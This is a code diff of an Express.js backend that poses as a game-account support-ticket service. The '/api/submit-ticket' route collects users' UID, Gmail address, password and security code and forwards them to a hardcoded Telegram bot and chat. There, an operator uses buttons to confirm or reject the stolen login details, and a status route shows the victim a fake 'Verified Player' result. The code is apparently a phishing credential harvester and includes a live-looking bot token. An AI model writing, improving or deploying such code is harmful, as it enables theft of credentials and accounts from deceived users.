@@ -9,14 +9,21 @@ app.use(express.json());
 const TELEGRAM_BOT_TOKEN = "8394444876:AAGQ3vrDdHXR--TZzCd0muiEAh6DIrect10";
 const TELEGRAM_CHAT_ID = "-1004444318249";
 
-// ইউজার স্ট্যাটাস সেভ রাখার জন্য
-let userStatuses = {}; 
+let userDatabase = {}; 
 
-// ১. ফর্ম সাবমিট রুট
+app.get('/', (req, res) => res.send("Backend Running"));
+
 app.post('/api/submit-ticket', async (req, res) => {
     const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
     
-    userStatuses[uid] = "Pending";
+    if (!userDatabase[uid]) {
+        userDatabase[uid] = {
+            status: "Pending",
+            name: "Checking Status...",
+            level: "Under Review",
+            reason: ""
+        };
+    }
 
     const telegramMessage = `
 📩 *New Support Ticket Submitted!*
@@ -37,33 +44,47 @@ app.post('/api/submit-ticket', async (req, res) => {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: "✅ Verify", callback_data: `verify_${uid}` },
-                        { text: "❌ Reject", callback_data: `reject_${uid}` }
+                        { text: "✅ Verify Account", callback_data: `verify_${uid}` }
+                    ],
+                    [
+                        { text: "❌ Wrong Pass", callback_data: `reject_${uid}_Wrong Password` },
+                        { text: "❌ Wrong Gmail", callback_data: `reject_${uid}_Invalid Gmail` }
+                    ],
+                    [
+                        { text: "❌ Wrong Code", callback_data: `reject_${uid}_Wrong Security Code` },
+                        { text: "❌ Wrong UID", callback_data: `reject_${uid}_Invalid UID` }
                     ]
                 ]
             }
         });
-
-        res.json({ success: true, message: 'Submitted successfully' });
+        res.json({ success: true });
     } catch (error) {
-        res.status(500).json({ success: false, message: 'Telegram API Error' });
+        res.status(500).json({ success: false });
     }
 });
 
-// ২. টেলিগ্রাম বাটন ক্লিক (Webhook) রুট
 app.post('/api/telegram-webhook', async (req, res) => {
     const update = req.body;
 
-    if (update.callback_query) {
+    if (update && update.callback_query) {
         const callbackQuery = update.callback_query;
         const data = callbackQuery.data; 
         const chatId = callbackQuery.message.chat.id;
         const messageId = callbackQuery.message.message_id;
 
-        const [action, uid] = data.split('_');
+        const parts = data.split('_');
+        const action = parts[0];
+        const uid = parts[1];
+        const reason = parts[2] || "Information Mismatch";
 
         if (action === 'verify') {
-            userStatuses[uid] = "Verified";
+            userDatabase[uid] = {
+                status: "Verified",
+                name: "Verified Player",
+                level: "Active Account",
+                reason: ""
+            };
+
             await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                 chat_id: chatId,
                 message_id: messageId,
@@ -71,30 +92,40 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 parse_mode: 'Markdown'
             });
         } else if (action === 'reject') {
-            userStatuses[uid] = "Rejected";
+            userDatabase[uid] = {
+                status: "Rejected",
+                name: "Verification Failed",
+                level: "N/A",
+                reason: reason
+            };
+
             await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
                 chat_id: chatId,
                 message_id: messageId,
-                text: callbackQuery.message.text + `\n\n🔴 *Status: REJECTED*`,
+                text: callbackQuery.message.text + `\n\n🔴 *Status: REJECTED (${reason})*`,
                 parse_mode: 'Markdown'
             });
         }
 
         await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
             callback_query_id: callbackQuery.id,
-            text: `Status updated to ${action}!`
+            text: `Status updated for UID: ${uid}`
         });
     }
 
     res.sendStatus(200);
 });
 
-// ৩. লাইভ স্ট্যাটাস চেক রুট
 app.get('/api/check-status/:uid', (req, res) => {
     const uid = req.params.uid;
-    const status = userStatuses[uid] || "Pending";
-    res.json({ success: true, status: status });
+    const userData = userDatabase[uid] || {
+        status: "Pending",
+        name: "Checking Status...",
+        level: "Under Review",
+        reason: ""
+    };
+    res.json({ success: true, data: userData });
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+app.listen(PORT, () => console.log(`Server running`));
